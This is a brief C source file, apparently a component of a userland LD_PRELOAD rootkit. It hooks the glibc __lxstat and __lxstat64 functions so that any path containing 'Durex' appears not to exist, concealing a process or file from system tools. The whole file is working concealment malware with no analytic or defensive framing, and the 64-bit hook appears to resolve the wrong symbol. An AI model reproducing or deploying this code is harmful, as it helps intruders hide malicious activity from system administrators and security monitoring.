#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <errno.h>
#include <string.h>
static const char*process_to_filter = "Durex";
#define DECLARE_LXSTAT(lxstat, stat)static int(*original_##lxstat)(int,const char*,struct stat*)=NULL;int lxstat(int ver,const char *pathname,struct stat *buf){if(original_##lxstat==NULL){original_##lxstat=dlsym(RTLD_NEXT,"__lxstat");if(original_##lxstat==NULL){fprintf(stderr,"Error in dlsym: %s\n",dlerror());return -1;}}if(strstr(pathname,process_to_filter)){errno=ENOENT;return -1;}return original_##lxstat(ver,pathname,buf);}
DECLARE_LXSTAT(__lxstat64, stat64);
DECLARE_LXSTAT(__lxstat, stat);
